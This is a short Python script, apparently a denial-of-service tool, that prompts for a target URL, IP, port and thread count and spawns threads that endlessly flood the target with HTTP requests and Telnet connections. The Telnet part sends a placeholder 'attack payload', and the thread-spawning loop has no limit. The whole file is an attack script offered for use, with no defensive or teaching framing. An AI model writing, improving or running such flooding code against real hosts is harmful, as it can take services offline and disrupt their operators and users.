#! /bin/python3

import threading
import requests
import telnetlib


def dos(name, url, ip, port):
    while True:
        try:
            headers = {"User-Agent": "apache2handler"}
            r = requests.get(url, headers=headers)
            print(f"Thread Id: {name} : {r.status_code} Attacking....")

            # Telnet attack
            tn = telnetlib.Telnet(ip, port)
            tn.write(b"attack payload")  # replace with your own payload
            tn.read_until(b"expected response")  # replace with expected response

        except Exception as e:
            print(f"{name} : Error - {e}")


if __name__ == "__main__":
    url = input("Enter URL: ")
    ip = input("Enter IP address: ")
    port = input("Enter port: ")
    threads = int(input("Enter Number of Threads: "))
    while True:
        for i in range(threads):
            t = threading.Thread(target=dos, args=(i, url, ip, port))
            t.start()
